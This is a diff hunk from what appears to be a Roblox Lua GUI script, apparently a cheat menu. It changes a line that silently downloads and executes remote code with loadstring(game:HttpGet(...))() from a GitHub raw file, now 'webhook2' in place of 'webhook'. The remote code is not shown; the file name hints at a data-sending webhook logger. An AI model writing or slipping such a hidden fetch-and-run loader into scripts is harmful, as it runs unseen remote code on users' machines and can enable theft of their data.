@@ -1953,7 +1953,7 @@ Tab:dropdown({
 })
 
 wait(0.1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovelatinagirls/ilovelatinas/main/webhook"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovelatinagirls/ilovelatinas/main/webhook2"))()
 
 
 
